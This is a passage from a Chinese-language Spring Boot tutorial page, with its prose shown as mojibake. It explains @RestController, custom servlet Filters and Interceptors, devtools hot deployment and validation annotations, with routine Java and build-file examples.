<p><code>@RestController</code>åªè¿”å›å¯¹è±¡ï¼Œå¯¹è±¡æ•°æ®ç›´æ¥ä»¥ JSON æˆ– XML å½¢å¼å†™å…¥ HTTP å“åº”(Response)ä¸­ï¼Œè¿™ç§æƒ…å†µå±äº RESTful WebæœåŠ¡ï¼Œè¿™ä¹Ÿæ˜¯ç›®å‰æ—¥å¸¸å¼€å‘æ‰€æ¥è§¦çš„æœ€å¸¸ç”¨çš„æƒ…å†µï¼ˆå‰åç«¯åˆ†ç¦»ï¼‰ã€‚</p>
<p><img src="@source/assets/cs-note/framework/spring/SpringMVCRestController.png" alt="SpringMVC+RestController" loading="lazy"></p>
<p>å¦‚æœéœ€è¦åœ¨Spring4ä¹‹å‰å¼€å‘ RESTful WebæœåŠ¡çš„è¯ï¼Œä½ éœ€è¦ä½¿ç”¨<code>@Controller</code> å¹¶ç»“åˆ<code>@ResponseBody</code>æ³¨è§£ï¼Œä¹Ÿå°±æ˜¯è¯´<code>@Controller</code> +<code>@ResponseBody</code>= <code>@RestController</code>ï¼ˆSpring 4 ä¹‹åæ–°åŠ çš„æ³¨è§£ï¼‰ã€‚</p>
<blockquote>
<p><code>@ResponseBody</code> æ³¨è§£çš„ä½œç”¨æ˜¯å°† <code>Controller</code> çš„æ–¹æ³•è¿”å›çš„å¯¹è±¡é€šè¿‡é€‚å½“çš„è½¬æ¢å™¨è½¬æ¢ä¸ºæŒ‡å®šçš„æ ¼å¼ä¹‹åï¼Œå†™å…¥åˆ°HTTP å“åº”(Response)å¯¹è±¡çš„ bodyÂ ä¸­ï¼Œé€šå¸¸ç”¨æ¥è¿”å› JSON æˆ–è€… XML æ•°æ®ï¼Œè¿”å› JSON æ•°æ®çš„æƒ…å†µæ¯”è¾ƒå¤šã€‚</p>
</blockquote>
<p><img src="@source/assets/cs-note/framework/spring/Spring3.xMVCRESTfulWebæœåŠ¡å·¥ä½œæµç¨‹.png" alt="Spring3.xMVC RESTfulWebæœåŠ¡å·¥ä½œæµç¨‹" loading="lazy"></p>
<h2 id="spring-boot-filter" tabindex="-1"> Spring Boot Filter</h2>
<h3 id="filter-ä»‹ç»" tabindex="-1"> Filter ä»‹ç»</h3>
<p>Filter è¿‡æ»¤å™¨ä¸»è¦æ˜¯ç”¨æ¥è¿‡æ»¤ç”¨æˆ·è¯·æ±‚çš„ï¼Œå®ƒå…è®¸æˆ‘ä»¬å¯¹ç”¨æˆ·è¯·æ±‚è¿›è¡Œå‰ç½®å¤„ç†å’Œåç½®å¤„ç†ï¼Œæ¯”å¦‚å®ç° URL çº§åˆ«çš„æƒé™æ§åˆ¶ã€è¿‡æ»¤éæ³•è¯·æ±‚ç­‰ç­‰ã€‚Filter è¿‡æ»¤å™¨æ˜¯é¢å‘åˆ‡é¢ç¼–ç¨‹â€”â€”AOP çš„å…·ä½“å®ç°</p>
<p>å¦å¤–ï¼ŒFilter æ˜¯ä¾èµ–äº Servlet å®¹å™¨ï¼Œ<code>Filter</code>æ¥å£å°±åœ¨ Servlet åŒ…ä¸‹é¢ï¼Œå±äº Servlet è§„èŒƒçš„ä¸€éƒ¨åˆ†ã€‚æ‰€ä»¥ï¼Œå¾ˆå¤šæ—¶å€™ä¹Ÿç§°å…¶ä¸ºâ€œå¢å¼ºç‰ˆ Servletâ€ã€‚</p>
<h3 id="filteræ‹¦æˆªçš„å®ç°æœºåˆ¶" tabindex="-1"> Filteræ‹¦æˆªçš„å®ç°æœºåˆ¶</h3>
<p><code>Filter</code>æ¥å£ä¸­æœ‰ä¸€ä¸ªå«åš <code>doFilter</code> çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å®ç°äº†å¯¹ç”¨æˆ·è¯·æ±‚çš„è¿‡æ»¤ã€‚å…·ä½“æµç¨‹å¤§ä½“æ˜¯è¿™æ ·çš„ï¼š</p>
<ol>
<li>ç”¨æˆ·å‘é€è¯·æ±‚åˆ° web æœåŠ¡å™¨,è¯·æ±‚ä¼šå…ˆåˆ°è¿‡æ»¤å™¨ï¼›</li>
<li>è¿‡æ»¤å™¨ä¼šå¯¹è¯·æ±‚è¿›è¡Œä¸€äº›å¤„ç†æ¯”å¦‚è¿‡æ»¤è¯·æ±‚çš„å‚æ•°ã€ä¿®æ”¹è¿”å›ç»™å®¢æˆ·ç«¯çš„ response  çš„å†…å®¹ã€åˆ¤æ–­æ˜¯å¦è®©ç”¨æˆ·è®¿é—®è¯¥æ¥å£ç­‰ç­‰ã€‚</li>
<li>ç”¨æˆ·è¯·æ±‚å“åº”å®Œæ¯•ã€‚</li>
<li>è¿›è¡Œä¸€äº›è‡ªå·±æƒ³è¦çš„å…¶ä»–æ“ä½œã€‚</li>
</ol>
<p><img src="@source/assets/cs-note/framework/spring/Servlet-Filter.png" alt="" loading="lazy"></p>
<h3 id="è‡ªå®šä¹‰filter" tabindex="-1"> è‡ªå®šä¹‰Filter</h3>
<h4 id="æ‰‹åŠ¨æ³¨å†Œé…ç½®å®ç°" tabindex="-1"> æ‰‹åŠ¨æ³¨å†Œé…ç½®å®ç°</h4>
<p><strong>è‡ªå®šä¹‰çš„ Filter éœ€è¦å®ç°<code>javax.Servlet.Filter</code>æ¥å£ï¼Œå¹¶é‡å†™æ¥å£ä¸­å®šä¹‰çš„3ä¸ªæ–¹æ³•ã€‚</strong></p>
<p><code>MyFilter.java</code></p>
<div><pre><code><span>@Component</span>
<span>public</span> <span>class</span> <span>MyFilter</span> <span>implements</span> <span>Filter</span> <span>{</span>
    <span>private</span> <span>static</span> <span>final</span> <span>Logger</span> logger <span>=</span> <span>LoggerFactory</span><span>.</span><span>getLogger</span><span>(</span><span>MyFilter</span><span>.</span><span>class</span><span>)</span><span>;</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>init</span><span>(</span><span>FilterConfig</span> filterConfig<span>)</span> <span>{</span>
        logger<span>.</span><span>info</span><span>(</span><span>"åˆå§‹åŒ–è¿‡æ»¤å™¨ï¼š"</span><span>,</span> filterConfig<span>.</span><span>getFilterName</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>doFilter</span><span>(</span><span>ServletRequest</span> servletRequest<span>,</span> <span>ServletResponse</span> servletResponse<span>,</span> <span>FilterChain</span> filterChain<span>)</span> <span>throws</span> <span>IOException</span><span>,</span> <span>ServletException</span> <span>{</span>
        <span>//å¯¹è¯·æ±‚è¿›è¡Œé¢„å¤„ç†</span>
        logger<span>.</span><span>info</span><span>(</span><span>"è¿‡æ»¤å™¨å¼€å§‹å¯¹è¯·æ±‚è¿›è¡Œé¢„å¤„ç†ï¼š"</span><span>)</span><span>;</span>
        <span>HttpServletRequest</span> request <span>=</span> <span>(</span><span>HttpServletRequest</span><span>)</span> servletRequest<span>;</span>
        <span>String</span> requestUri <span>=</span> request<span>.</span><span>getRequestURI</span><span>(</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"è¯·æ±‚çš„æ¥å£ä¸ºï¼š"</span> <span>+</span> requestUri<span>)</span><span>;</span>
        <span>long</span> startTime <span>=</span> <span>System</span><span>.</span><span>currentTimeMillis</span><span>(</span><span>)</span><span>;</span>
        <span>//é€šè¿‡ doFilter æ–¹æ³•å®ç°è¿‡æ»¤åŠŸèƒ½</span>
        filterChain<span>.</span><span>doFilter</span><span>(</span>servletRequest<span>,</span> servletResponse<span>)</span><span>;</span>
        <span>// ä¸Šé¢çš„ doFilter æ–¹æ³•æ‰§è¡Œç»“æŸåç”¨æˆ·çš„è¯·æ±‚å·²ç»è¿”å›</span>
        <span>long</span> endTime <span>=</span> <span>System</span><span>.</span><span>currentTimeMillis</span><span>(</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"è¯¥ç”¨æˆ·çš„è¯·æ±‚å·²ç»å¤„ç†å®Œæ¯•ï¼Œè¯·æ±‚èŠ±è´¹çš„æ—¶é—´ä¸ºï¼š"</span> <span>+</span> <span>(</span>endTime <span>-</span> startTime<span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>destroy</span><span>(</span><span>)</span> <span>{</span>
        logger<span>.</span><span>info</span><span>(</span><span>"é”€æ¯è¿‡æ»¤å™¨"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><p><code>MyFilterConfig.java</code></p>
<p><strong>åœ¨é…ç½®ä¸­æ³¨å†Œè‡ªå®šä¹‰çš„è¿‡æ»¤å™¨ã€‚</strong></p>
<div><pre><code><span>@Configuration</span>
<span>public</span> <span>class</span> <span>MyFilterConfig</span> <span>{</span>
    <span>@Autowired</span>
    <span>MyFilter</span> myFilter<span>;</span>
    <span>@Bean</span>
    <span>public</span> <span>FilterRegistrationBean</span><span><span>&lt;</span><span>MyFilter</span><span>></span></span> <span>thirdFilter</span><span>(</span><span>)</span> <span>{</span>
        <span>FilterRegistrationBean</span><span><span>&lt;</span><span>MyFilter</span><span>></span></span> filterRegistrationBean <span>=</span> <span>new</span> <span>FilterRegistrationBean</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>

        filterRegistrationBean<span>.</span><span>setFilter</span><span>(</span>myFilter<span>)</span><span>;</span>

        filterRegistrationBean<span>.</span><span>setUrlPatterns</span><span>(</span><span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>Arrays</span><span>.</span><span>asList</span><span>(</span><span>"/api/*"</span><span>)</span><span>)</span><span>)</span><span>;</span>

        <span>return</span> filterRegistrationBean<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h4 id="æ³¨è§£å®ç°" tabindex="-1"> æ³¨è§£å®ç°</h4>
<p><strong>åœ¨è‡ªå·±çš„è¿‡æ»¤å™¨çš„ç±»ä¸ŠåŠ ä¸Š<code>@WebFilter</code> ç„¶ååœ¨è¿™ä¸ªæ³¨è§£ä¸­é€šè¿‡å®ƒæä¾›å¥½çš„ä¸€äº›å‚æ•°è¿›è¡Œé…ç½®ã€‚</strong></p>
<div><pre><code><span>@WebFilter</span><span>(</span>filterName <span>=</span> <span>"MyFilterWithAnnotation"</span><span>,</span> urlPatterns <span>=</span> <span>"/api/*"</span><span>)</span>
<span>public</span> <span>class</span> <span>MyFilterWithAnnotation</span> <span>implements</span> <span>Filter</span> <span>{</span>

   <span>.</span><span>.</span><span>.</span><span>.</span><span>.</span><span>.</span>
<span>}</span>
</code></pre></div><h3 id="å¤šä¸ªfilteré¡ºåº" tabindex="-1"> å¤šä¸ªFilteré¡ºåº</h3>
<p><strong>åœ¨é…ç½®ä¸­æ³¨å†Œè‡ªå®šä¹‰çš„è¿‡æ»¤å™¨ï¼Œé€šè¿‡<code>FilterRegistrationBean</code> çš„<code>setOrder</code> æ–¹æ³•å¯ä»¥å†³å®š Filter çš„æ‰§è¡Œé¡ºåºã€‚</strong></p>
<h2 id="spring-boot-interceptor" tabindex="-1"> Spring Boot Interceptor</h2>
<h3 id="interceptorä»‹ç»" tabindex="-1"> Interceptorä»‹ç»</h3>
<p><strong>æ‹¦æˆªå™¨(Interceptor)</strong> åŒFilter è¿‡æ»¤å™¨ä¸€æ ·ï¼Œå®ƒä¿©éƒ½æ˜¯é¢å‘åˆ‡é¢ç¼–ç¨‹â€”â€”AOP çš„å…·ä½“å®ç°ã€‚</p>
<p>ä½ å¯ä»¥ä½¿ç”¨ Interceptor æ¥æ‰§è¡ŒæŸäº›ä»»åŠ¡ï¼Œä¾‹å¦‚åœ¨ <strong>Controller</strong> å¤„ç†è¯·æ±‚ä¹‹å‰ç¼–å†™æ—¥å¿—ï¼Œæ·»åŠ æˆ–æ›´æ–°é…ç½®......</p>
<p>åœ¨ <strong>Springä¸­</strong>ï¼Œå½“è¯·æ±‚å‘é€åˆ° <strong>Controller</strong> æ—¶ï¼Œåœ¨è¢«<strong>Controller</strong>å¤„ç†ä¹‹å‰ï¼Œå®ƒå¿…é¡»ç»è¿‡ <strong>Interceptors</strong>ï¼ˆ0æˆ–æ›´å¤šï¼‰ã€‚</p>
<p><strong>Spring Interceptor</strong>æ˜¯ä¸€ä¸ªéå¸¸ç±»ä¼¼äº<strong>Servlet Filter</strong> çš„æ¦‚å¿µ ã€‚</p>
<h3 id="è¿‡æ»¤å™¨å’Œæ‹¦æˆªå™¨çš„åŒºåˆ«" tabindex="-1"> è¿‡æ»¤å™¨å’Œæ‹¦æˆªå™¨çš„åŒºåˆ«</h3>
<p>å¯¹äºè¿‡æ»¤å™¨å’Œæ‹¦æˆªå™¨çš„åŒºåˆ«ï¼Œ <a href="https://www.zhihu.com/question/35225845/answer/61876681" target="_blank" rel="noopener noreferrer">çŸ¥ä¹@Kangol LI</a> çš„å›ç­”å¾ˆä¸é”™ã€‚</p>
<ul>
<li>è¿‡æ»¤å™¨ï¼ˆFilterï¼‰ï¼šå½“ä½ æœ‰ä¸€å †ä¸œè¥¿çš„æ—¶å€™ï¼Œä½ åªå¸Œæœ›é€‰æ‹©ç¬¦åˆä½ è¦æ±‚çš„æŸä¸€äº›ä¸œè¥¿ã€‚å®šä¹‰è¿™äº›è¦æ±‚çš„å·¥å…·ï¼Œå°±æ˜¯è¿‡æ»¤å™¨ã€‚</li>
<li>æ‹¦æˆªå™¨ï¼ˆInterceptorï¼‰ï¼šåœ¨ä¸€ä¸ªæµç¨‹æ­£åœ¨è¿›è¡Œçš„æ—¶å€™ï¼Œä½ å¸Œæœ›å¹²é¢„å®ƒçš„è¿›å±•ï¼Œç”šè‡³ç»ˆæ­¢å®ƒè¿›è¡Œï¼Œè¿™æ˜¯æ‹¦æˆªå™¨åšçš„äº‹æƒ…ã€‚</li>
</ul>
<h3 id="è‡ªå®šä¹‰-interceptor" tabindex="-1"> è‡ªå®šä¹‰ Interceptor</h3>
<p>å¦‚æœä½ éœ€è¦è‡ªå®šä¹‰ <strong>Interceptor</strong> çš„è¯å¿…é¡»å®ç° <strong>org.springframework.web.servlet.HandlerInterceptor</strong>æ¥å£æˆ–ç»§æ‰¿ <strong>org.springframework.web.servlet.handler.HandlerInterceptorAdapter</strong>ç±»ï¼Œå¹¶ä¸”éœ€è¦é‡å†™ä¸‹é¢ä¸‹é¢3ä¸ªæ–¹æ³•ï¼š</p>
<div><pre><code>    <span>public</span> <span>boolean</span> <span>preHandle</span><span>(</span><span>HttpServletRequest</span> request<span>,</span> <span>HttpServletResponse</span> response<span>,</span> <span>Object</span> handler<span>)</span> <span>{</span>
    <span>}</span>


    <span>public</span> <span>void</span> <span>postHandle</span><span>(</span><span>HttpServletRequest</span> request<span>,</span> <span>HttpServletResponse</span> response<span>,</span>
                           <span>Object</span> handler<span>,</span> <span>ModelAndView</span> modelAndView<span>)</span> <span>{</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>afterCompletion</span><span>(</span><span>HttpServletRequest</span> request<span>,</span> <span>HttpServletResponse</span> response<span>,</span>
                                <span>Object</span> handler<span>,</span> <span>Exception</span> ex<span>)</span> <span>{</span>
    <span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><p>æ³¨æ„ï¼š <em><strong>preHandle</strong></em>æ–¹æ³•è¿”å› <strong>true</strong>æˆ– <strong>false</strong>ã€‚å¦‚æœè¿”å› <strong>true</strong>ï¼Œåˆ™æ„å‘³ç€è¯·æ±‚å°†ç»§ç»­åˆ°è¾¾ <strong>Controller</strong> è¢«å¤„ç†ã€‚</p>
<p><img src="@source/assets/cs-note/framework/spring/interceptor-spring.png" alt="" loading="lazy"></p>
<p><strong>é…ç½®æ‹¦æˆªå™¨</strong></p>
<div><pre><code><span>@Configuration</span>
<span>public</span> <span>class</span> <span>WebConfig</span> <span>implements</span> <span>WebMvcConfigurer</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>addInterceptors</span><span>(</span><span>InterceptorRegistry</span> registry<span>)</span> <span>{</span>
        <span>// LogInterceptor apply to all URLs.</span>
        registry<span>.</span><span>addInterceptor</span><span>(</span><span>new</span> <span>MyInterceptor</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h2 id="spring-boot-å¼‚å¸¸å¤„ç†" tabindex="-1"> Spring Boot å¼‚å¸¸å¤„ç†</h2>
<h3 id="controlleradviceå’Œ-exceptionhandlerå¤„ç†å…¨å±€å¼‚å¸¸" tabindex="-1"> @ControllerAdviceå’Œ@ExceptionHandlerå¤„ç†å…¨å±€å¼‚å¸¸</h3>
<h3 id="exceptionhandler-å¤„ç†-controller-çº§åˆ«çš„å¼‚å¸¸" tabindex="-1"> @ExceptionHandler å¤„ç† Controller çº§åˆ«çš„å¼‚å¸¸</h3>
<h3 id="responsestatusexception" tabindex="-1"> ResponseStatusException</h3>
<h3 id="å¸¸ç”¨è§£å†³æ–¹æ¡ˆ" tabindex="-1"> å¸¸ç”¨è§£å†³æ–¹æ¡ˆ</h3>
<h2 id="spring-boot-çƒ­éƒ¨ç½²" tabindex="-1"> Spring Boot çƒ­éƒ¨ç½²</h2>
<blockquote>
<p>çƒ­éƒ¨ç½²å¯ä»¥ç®€å•çš„è¿™æ ·ç†è§£ï¼šæˆ‘ä»¬ä¿®æ”¹ç¨‹åºä»£ç åä¸éœ€è¦é‡æ–°å¯åŠ¨ç¨‹åºï¼Œå°±å¯ä»¥è·å–åˆ°æœ€æ–°çš„ä»£ç ï¼Œæ›´æ–°ç¨‹åºå¯¹å¤–çš„è¡Œä¸ºã€‚</p>
</blockquote>
<p>é€šè¿‡ SpringBoot æä¾›çš„ spring-boot-devtools å®ç°ç®€å•çš„çƒ­éƒ¨ç½²ã€‚</p>
<p><strong>ä¾èµ–:</strong></p>
<p>Maven:</p>
<div><pre><code>		<span><span><span>&lt;</span>dependency</span><span>></span></span>
			<span><span><span>&lt;</span>groupId</span><span>></span></span>org.springframework.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>
			<span><span><span>&lt;</span>artifactId</span><span>></span></span>spring-boot-devtools<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
            <span><span><span>&lt;</span>scope</span><span>></span></span>runtime<span><span><span>&lt;/</span>scope</span><span>></span></span>
			<span><span><span>&lt;</span>optional</span><span>></span></span>true<span><span><span>&lt;/</span>optional</span><span>></span></span>
		<span><span><span>&lt;/</span>dependency</span><span>></span></span>
</code></pre></div><div><pre><code>  <span><span><span>&lt;</span>plugin</span><span>></span></span>
     <span><span><span>&lt;</span>groupId</span><span>></span></span>org.springframework.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>
     <span><span><span>&lt;</span>artifactId</span><span>></span></span>spring-boot-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
  <span><span><span>&lt;/</span>plugin</span><span>></span></span>
</code></pre></div><p>Gradle:</p>
<div><pre><code>configurations <span>{</span>
    developmentOnly
    runtimeClasspath <span>{</span>
        extendsFrom developmentOnly
    <span>}</span>
<span>}</span>
dependencies <span>{</span>
      <span>developmentOnly</span><span>(</span><span><span>"org.springframework.boot:spring-boot-devtools"</span></span><span>)</span>
<span>}</span>

</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h1 id="spring-boot-è¿›é˜¶" tabindex="-1"> Spring Boot è¿›é˜¶</h1>
<h2 id="beanæ˜ å°„å·¥å…·" tabindex="-1"> Beanæ˜ å°„å·¥å…·</h2>
<p>åœ¨å®é™…é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­ï¼Œç»å¸¸éœ€è¦å°†ä¸åŒçš„ä¸¤ä¸ªå¯¹è±¡å®ä¾‹è¿›è¡Œå±æ€§å¤åˆ¶ï¼Œä»è€ŒåŸºäºæºå¯¹è±¡çš„å±æ€§ä¿¡æ¯è¿›è¡Œåç»­æ“ä½œï¼Œè€Œä¸æ”¹å˜æºå¯¹è±¡çš„å±æ€§ä¿¡æ¯,æ¯”å¦‚DTOæ•°æ®ä¼ è¾“å¯¹è±¡å’Œæ•°æ®å¯¹è±¡DOï¼Œæˆ‘ä»¬éœ€è¦å°†DOå¯¹è±¡è¿›è¡Œå±æ€§å¤åˆ¶åˆ°DTOï¼Œä½†æ˜¯å¯¹è±¡æ ¼å¼åˆä¸ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç¼–å†™æ˜ å°„ä»£ç å°†å¯¹è±¡ä¸­çš„å±æ€§å€¼ä»ä¸€ç§ç±»å‹è½¬æ¢æˆå¦ä¸€ç§ç±»å‹ã€‚</p>
<p>åˆ›å»ºç”±å¤šä¸ªå±‚ç»„æˆçš„å¤§å‹ Java åº”ç”¨ç¨‹åºéœ€è¦ä½¿ç”¨å¤šç§é¢†åŸŸæ¨¡å‹ï¼Œå¦‚æŒä¹…åŒ–æ¨¡å‹ã€é¢†åŸŸæ¨¡å‹æˆ–è€…æ‰€è°“çš„ DTOã€‚ä¸ºä¸åŒçš„åº”ç”¨ç¨‹åºå±‚ä½¿ç”¨å¤šä¸ªæ¨¡å‹å°†è¦æ±‚æˆ‘ä»¬æä¾› bean ä¹‹é—´çš„æ˜ å°„æ–¹æ³•ã€‚æ‰‹åŠ¨æ‰§è¡Œæ­¤æ“ä½œå¯ä»¥å¿«é€Ÿåˆ›å»ºå¤§é‡æ ·æ¿ä»£ç å¹¶æ¶ˆè€—å¤§é‡æ—¶é—´ã€‚å¹¸è¿çš„æ˜¯ï¼ŒJava æœ‰å¤šä¸ªå¯¹è±¡æ˜ å°„æ¡†æ¶ã€‚</p>
<h2 id="å‚æ•°æ ¡éªŒ" tabindex="-1"> å‚æ•°æ ¡éªŒ</h2>
<p>å³ä½¿åœ¨å‰ç«¯å¯¹æ•°æ®è¿›è¡Œæ ¡éªŒçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦å¯¹ä¼ å…¥åç«¯çš„æ•°æ®å†è¿›è¡Œä¸€éæ ¡éªŒï¼Œé¿å…ç”¨æˆ·ç»•è¿‡æµè§ˆå™¨ç›´æ¥é€šè¿‡ä¸€äº› HTTP å·¥å…·ç›´æ¥å‘åç«¯è¯·æ±‚ä¸€äº›è¿æ³•æ•°æ®</p>
<h3 id="æ ¡éªŒæ³¨è§£" tabindex="-1"> æ ¡éªŒæ³¨è§£</h3>
<p><strong>JSRæä¾›çš„æ ¡éªŒæ³¨è§£</strong></p>
<ul>
<li><code>@Null</code>   è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»ä¸º null</li>
<li><code>@NotNull</code>    è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»ä¸ä¸º null</li>
<li><code>@AssertTrue</code>     è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»ä¸º true</li>
<li><code>@AssertFalse</code>    è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»ä¸º false</li>
<li><code>@Min(value) </code>    è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œå…¶å€¼å¿…é¡»å¤§äºç­‰äºæŒ‡å®šçš„æœ€å°å€¼</li>
<li><code>@Max(value) </code>    è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œå…¶å€¼å¿…é¡»å°äºç­‰äºæŒ‡å®šçš„æœ€å¤§å€¼</li>
<li><code>@DecimalMin(value) </code> è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œå…¶å€¼å¿…é¡»å¤§äºç­‰äºæŒ‡å®šçš„æœ€å°å€¼</li>
<li><code>@DecimalMax(value)</code>  è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œå…¶å€¼å¿…é¡»å°äºç­‰äºæŒ‡å®šçš„æœ€å¤§å€¼</li>
<li><code>@Size(max=, min=) </code>  è¢«æ³¨é‡Šçš„å…ƒç´ çš„å¤§å°å¿…é¡»åœ¨æŒ‡å®šçš„èŒƒå›´å†…</li>
<li><code>@Digits (integer, fraction) </code>    è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œå…¶å€¼å¿…é¡»åœ¨å¯æ¥å—çš„èŒƒå›´å†…</li>
<li><code>@Past </code>  è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»æ˜¯ä¸€ä¸ªè¿‡å»çš„æ—¥æœŸ</li>
<li><code>@Future</code>     è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»æ˜¯ä¸€ä¸ªå°†æ¥çš„æ—¥æœŸ</li>
<li><code>@Pattern(regex=,flag=) </code> è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»ç¬¦åˆæŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼</li>
</ul>
<p><strong>Hibernate Validatoræä¾›çš„æ ¡éªŒæ³¨è§£</strong>ï¼š</p>
<ul>
<li><code>@NotBlank(message =) </code>  éªŒè¯å­—ç¬¦ä¸²énullï¼Œä¸”é•¿åº¦å¿…é¡»å¤§äº0</li>
<li><code>@Email</code>  è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»æ˜¯ç”µå­é‚®ç®±åœ°å€</li>
<li><code>@Length(min=,max=) </code> è¢«æ³¨é‡Šçš„å­—ç¬¦ä¸²çš„å¤§å°å¿…é¡»åœ¨æŒ‡å®šçš„èŒƒå›´å†…</li>
<li><code>@NotEmpty </code>  è¢«æ³¨é‡Šçš„å­—ç¬¦ä¸²çš„å¿…é¡»éç©º</li>
<li><code>@Range(min=,max=,message=)</code>  è¢«æ³¨é‡Šçš„å…ƒç´ å¿…é¡»åœ¨åˆé€‚çš„èŒƒå›´å†…</li>
</ul>
<h3 id="éªŒè¯controllerçš„è¾“å…¥" tabindex="-1"> éªŒè¯Controllerçš„è¾“å…¥</h3>
<p><strong>éªŒè¯è¯·æ±‚ä½“(RequestBody)</strong></p>
<p>åœ¨éœ€è¦éªŒè¯çš„å‚æ•°ä¸ŠåŠ ä¸Šäº†<code>@Valid</code>æ³¨è§£ï¼Œå¦‚æœéªŒè¯å¤±è´¥ï¼Œå®ƒå°†æŠ›å‡º<code>MethodArgumentNotValidException</code>ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒSpringä¼šå°†æ­¤å¼‚å¸¸è½¬æ¢ä¸ºHTTP Status 400ï¼ˆé”™è¯¯è¯·æ±‚ï¼‰ã€‚</p>
<p><strong>éªŒè¯è¯·æ±‚å‚æ•°(Path Variables å’Œ Request Parameters)</strong></p>
<p>åœ¨éœ€è¦éªŒè¯çš„å‚æ•°ä¸ŠåŠ ä¸Šäº†<code>@Valid</code>æ³¨è§£</p>
<p>ä¸€å®šä¸è¦å¿˜è®°åœ¨ç±»ä¸ŠåŠ ä¸Š <code>Validated</code> æ³¨è§£äº†ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥å‘Šè¯‰ Spring å»æ ¡éªŒæ–¹æ³•å‚æ•°ã€‚</p>
<h3 id="éªŒè¯-service-ä¸­çš„æ–¹æ³•" tabindex="-1"> éªŒè¯ Service ä¸­çš„æ–¹æ³•</h3>
<p>è¿˜å¯ä»¥éªŒè¯ä»»ä½•Springç»„ä»¶çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯éªŒè¯æ§åˆ¶å™¨çº§åˆ«çš„è¾“å…¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>@Validated</code>å’Œ<code>@Valid</code>æ³¨é‡Šçš„ç»„åˆæ¥å®ç°è¿™ä¸€éœ€æ±‚ã€‚</p>
<p>ä¸€å®šä¸è¦å¿˜è®°åœ¨ç±»ä¸ŠåŠ ä¸Š <code>Validated</code> æ³¨è§£äº†ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥å‘Šè¯‰ Spring å»æ ¡éªŒæ–¹æ³•å‚æ•°ã€‚</p>
<h3 id="validator-ç¼–ç¨‹æ–¹å¼æ‰‹åŠ¨è¿›è¡Œå‚æ•°éªŒè¯" tabindex="-1"> Validator ç¼–ç¨‹æ–¹å¼æ‰‹åŠ¨è¿›è¡Œå‚æ•°éªŒè¯</h3>
<p>æŸäº›åœºæ™¯ä¸‹å¯èƒ½ä¼šéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ ¡éªŒå¹¶è·å¾—æ ¡éªŒç»“æœã€‚</p>
<div><pre><code>        <span>ValidatorFactory</span> factory <span>=</span> <span>Validation</span><span>.</span><span>buildDefaultValidatorFactory</span><span>(</span><span>)</span><span>;</span>
